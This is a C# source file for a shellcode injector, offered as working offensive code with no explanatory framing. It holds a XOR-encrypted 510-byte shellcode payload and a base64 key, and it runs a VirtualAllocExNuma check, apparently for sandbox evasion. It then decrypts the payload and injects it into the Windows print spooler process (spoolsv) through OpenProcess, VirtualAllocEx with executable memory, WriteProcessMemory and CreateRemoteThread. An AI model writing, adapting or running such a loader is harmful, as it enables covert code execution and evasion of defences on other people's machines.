using System;
using System.Diagnostics;
using System.Runtime.InteropServices;


namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        static void Main(string[] args)
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }
            byte[] key = Convert.FromBase64String("frZstgVonk1WpSLeb9ZKcoDkGPzHWDqSAMyTxoopGc8=");

            byte[] buf = new byte[510] {
0x82,0xfe,0xef,0x52,0xf5,0x80,0x52,0x4d,0x56,0xa5,0x63,0x8f,0x2e,0x86,0x18,0x3a,0xb1,0x36,0x7d,0xb4,0x4c,0x0a,0x5a,0xda,0x8b,0x9e,0x8b,0x8e,0x01,0x7b,0x39,0x9e,0x28,0xfe,0x63,0x01,0x4f,0x22,0xd6,0xc6,0x24,0xf5,0x6f,0xef,0xa6,0x9e,0x7b,0xb2,0x2c,0xd8,0x79,0x80,0xc5,0x74,0x1a,0xd3,0xc1,0x05,0x9e,0x87,0x8b,0xe8,0xfb,0x22,0x2c,0xfe,0xe7,0xe4,0x25,0xe3,0xdc,0x71,0x1e,0xa4,0xf2,0x9f,0x3e,0xb0,0xcb,0x0a,0x98,0xef,0x1a,0xf3,0x42,0x2a,0x3a,0x92,0x00,0x47,0x13,0x4e,0x8a,0x29,0x19,0x87,0xfb,0x76,0x18,0xd1,0x4d,0x69,0x4e,0x09,0xdd,0xe5,0x02,0x55,0x27,0xce,0x03,0x73,0x50,0xb4,0xfb,0xaa,0x8a,0x69,0xf3,0xda,0xff,0x05,0xd2,0x4d,0xbe,0xa1,0x51,0xce,0xa8,0xfe,0x5d,0x76,0xa9,0x29,0x5f,0x84,0x5b,0xe4,0x23,0x1f,0x57,0x36,0x3f,0x83,0xcc,0xe7,0x54,0xd8,0xcf,0x1d,0x03,0x43,0x75,0x14,0xcb,0x82,0x01,0x69,0x3d,0x86,0x7f,0x66,0x0a,0xf7,0x8e,0x64,0xd6,0x09,0xdd,0xe5,0x3e,0x97,0x6e,0x06,0x0b,0xf9,0x84,0x6c,0x59,0xa4,0x8f,0x59,0xea,0xd3,0x58,0x92,0xca,0x9c,0xcb,0x71,0x58,0x96,0x3f,0xec,0x24,0x35,0xe9,0x48,0xdf,0x1f,0xa9,0x45,0x7a,0x9f,0x36,0x8c,0x02,0xf9,0x92,0x0d,0x53,0x03,0x38,0xa7,0x67,0xdb,0xbe,0xbb,0xe0,0xf4,0xd5,0x1a,0x2b,0xcf,0x7e,0xf7,0x3a,0xff,0x8c,0x8e,0xd6,0xcc,0xba,0x05,0x23,0xde,0x6f,0x9f,0xc3,0x97,0xc9,0x58,0x1a,0xfc,0xc6,0xe3,0xfa,0x3a,0x31,0xbd,0xd2,0x92,0xc3,0xa0,0xfd,0x83,0xf7,0x47,0x2d,0x0c,0x49,0x1f,0xb8,0x4a,0xa9,0x70,0x6e,0x57,0x85,0xbe,0x4b,0x73,0x80,0xe4,0x41,0xbd,0x7d,0x71,0xba,0xf9,0x00,0x33,0x46,0xac,0x80,0x68,0x47,0x9f,0x2e,0xfb,0x5d,0x7f,0x48,0x59,0x5e,0x05,0xa9,0x65,0x6a,0x57,0xad,0x9e,0xb5,0xb2,0xc8,0x6d,0xd9,0xbd,0x7d,0xb2,0x35,0x4d,0xe0,0x33,0x46,0x8e,0x03,0xee,0x73,0xdf,0x3f,0xee,0x20,0x3f,0xe7,0x20,0x17,0xb4,0x17,0x1f,0xbb,0x7b,0x1b,0xb7,0xb5,0xa7,0x05,0x24,0x6c,0xf6,0x8e,0xa7,0xf4,0xe7,0xe5,0x24,0x00,0xc6,0x8a,0x29,0x51,0x4c,0x92,0xa6,0x24,0x3f,0xe7,0x25,0xaf,0x84,0x3c,0xa1,0x63,0x86,0x27,0x5f,0xb3,0x33,0x3a,0xe6,0xc1,0x34,0x98,0xa7,0xef,0x11,0xf8,0xcc,0xed,0x93,0xc2,0xaa,0xdd,0xef,0x20,0x3f,0x9a,0xdc,0x45,0x29,0xc7,0x25,0x56,0xb5,0x22,0xde,0x2e,0x8e,0x02,0xfb,0x72,0xac,0x29,0x35,0x86,0xe2,0x62,0x36,0x53,0x29,0x6c,0x13,0xc2,0xa0,0xda,0x86,0xf7,0x71,0x21,0x87,0xcc,0x21,0x17,0xbd,0x1e,0x2c,0xf8,0x96,0xe6,0x2f,0x0b,0xc8,0x82,0x3d,0xd0,0xa3,0x38,0x8d,0xb9,0x6a,0x00,0xb1,0xbb,0x9e,0xcb,0x7e,0x40,0xa7,0x7e,0xf6,0x6c,0xb6,0x44,0x30,0xf4,0x4d,0x0c,0xe4,0x98,0xd5,0x40,0xd9,0x7a,0x8d,0x55,0xb3,0x41,0xbd,0x7d,0x2d,0x54,0xdf,0x61,0x33,0x46,0x8f,0x75,0xe7,0xf0,0xf3,0x81,0x49,0x93,0xfe,0x04,0xab,0xd6,0x64,0x90,0xed,0xa7,0x28,0x1a,0x62,0x0b,0x8d,0x67,0xbc,0x72,0xfc,0x9e,0x11,0xfd,0x50,0xf0,0x79,0x31,0x90,0x75,0xfc };

            byte[] decShell = XorDecrypt(buf, key);

            int size = decShell.Length;

            Process[] expProc = Process.GetProcessesByName("spoolsv");
            int pid = expProc[0].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, decShell, decShell.Length, out outSize);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
        private static byte[] XorDecrypt(byte[] shellcode, byte[] key)
        {
            byte[] decShellCode = new byte[shellcode.Length];

            for (int i = 0; i < shellcode.Length; i++)
            {
                decShellCode[i] = (byte)(shellcode[i] ^ key[i % key.Length]);
            }
            return decShellCode;
        }
    }
}